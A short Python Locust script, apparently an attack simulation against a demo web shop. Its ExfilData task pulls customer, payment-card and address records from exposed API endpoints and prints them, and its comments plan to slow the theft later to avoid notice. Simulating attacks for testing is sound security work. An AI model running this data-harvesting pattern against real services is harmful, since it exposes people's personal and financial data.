import base64

from locust import HttpLocust, TaskSet, task
#from random import randint, choice
import random
import string
import cPickle as pickle


class ExfilData(TaskSet):
    
    # This is going to be very simple
    # We are going to take some data via the exposed
    # Users API via a simple call to the API exposed
    # at the front-end service
    # NOTE: will need to adjust parameters (i.e. steal 
    # data more slowly) in the future probably
    # Note: I am putting this into a Locust script for 
    # now (instead of just a python script) to make
    # it easier to modify later (where Locust will probably
    # be important)
    @task
    def take_data(self):
        customers = self.client.get("/customers")
        cards = self.client.get("/cards")
        addresses = self.client.get("/addresses")
        print "customers: ", customers.text
        print "cards: ", cards.text
        print "addresses: ", addresses.text

class loadDB(HttpLocust):
    print "About to exfiltrate some data"
    task_set = ExfilData
